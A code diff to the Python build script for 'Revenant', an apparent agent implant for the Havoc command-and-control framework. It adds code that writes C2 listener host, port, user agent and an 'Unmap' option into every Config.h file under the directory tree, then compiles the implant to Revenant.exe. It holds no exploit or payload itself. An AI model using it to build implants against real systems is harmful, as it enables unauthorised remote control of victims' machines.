@@ -1,4 +1,5 @@
 import subprocess
+import glob
 
 from base64 import b64decode
 from havoc.service import HavocService
@@ -12,6 +13,20 @@ COMMAND_UPLOAD: int = 0x153
 COMMAND_DOWNLOAD: int = 0x154
 COMMAND_EXIT: int = 0x155
 COMMAND_OUTPUT: int = 0x200
+
+
+def process_config_h(config: dict):
+    header_file = f"""
+#define CONFIG_USER_AGENT L"{config['Options']['Listener']['UserAgent']}"
+#define CONFIG_HOST       L"{config['Options']['Listener']['HostBind']}"
+#define CONFIG_PORT       {config['Options']['Listener']['Port']}
+#define CONFIG_SECURE     {config['Options']['Listener']['Secure']}
+#define CONFIG_SLEEP      {config['Config']['Sleep']}  
+#define CONFIG_UNMAP      {config['Config']['Unmap']}    
+    """
+    for filepath in glob.iglob('**/Config.h', recursive=True):
+        with open(filepath, 'w') as f:
+            f.write(header_file)
 
 
 class CommandShell(Command):
@@ -121,7 +136,10 @@ class Revenant(AgentType):
             {"Name": "Windows Exe", "Extension": "exe"},
             {"Name": "Windows DLL", "Extension": "dll"}
         ]
-        self.BuildingConfig: dict = {"Sleep": "10"}
+        self.BuildingConfig: dict = {
+            "Sleep": "10",
+            "Unmap": True
+        }
         self.Commands: list = [
             CommandShell(),
             CommandUpload(),
@@ -140,12 +158,8 @@ class Revenant(AgentType):
         # parse options from self
         print(f"[*] Revenant Magic Value {self.MagicValue}")
 
-        # parse config
-        compile_arch = config['Options']['Arch']
-        compile_format = config['Options']['Format']
-
-        print(f"[*] Revenant Payload Arch:   {compile_arch}")
-        print(f"[*] Revenant Payload Format: {compile_format}")
+        print("[*] Configuring Config.h header...")
+        process_config_h(config)
         compile_command: str = "cd ./Agent && make"
 
         try:
@@ -158,6 +172,7 @@ class Revenant(AgentType):
             print(process.stdout)
         except subprocess.CalledProcessError as error:
             print(f"Error occurred: {error.stderr}")
+            return
 
         data = open("./Agent/Bin/Revenant.exe", "rb").read()
 
